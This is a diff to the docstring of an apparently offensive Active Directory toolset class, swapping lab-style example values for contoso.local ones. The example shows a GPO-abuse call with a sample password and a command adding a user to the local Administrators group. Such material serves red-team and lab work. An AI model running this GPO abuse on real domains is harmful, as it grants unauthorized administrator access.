@@ -640,7 +640,7 @@ class ACLExploitTools(Toolset):
 
         Args:
             gpo_name: Name of the GPO you have write access to (e.g., "StarkWallpaper")
-            domain: Target domain (e.g., north.sevenkingdoms.local)
+            domain: Target domain (e.g., contoso.local)
             username: Username with GPO write permissions
             password: Password for authentication
             dc_ip: Domain controller IP address
@@ -653,12 +653,12 @@ class ACLExploitTools(Toolset):
 
         Example:
             >>> pygpoabuse_immediate_task(
-            ...     gpo_name="StarkWallpaper",
-            ...     domain="north.sevenkingdoms.local",
-            ...     username="samwell.tarly",
-            ...     password="Heartsbane",  # pragma: allowlist secret
-            ...     dc_ip="10.1.2.240",
-            ...     command="net localgroup Administrators samwell.tarly /add"
+            ...     gpo_name="DefaultWallpaper",
+            ...     domain="contoso.local",
+            ...     username="sql_svc",
+            ...     password="SqlP@ss123",  # pragma: allowlist secret
+            ...     dc_ip="192.168.58.240",
+            ...     command="net localgroup Administrators sql_svc /add"
             ... )
         """
         # Build pygpoabuse command for immediate scheduled task
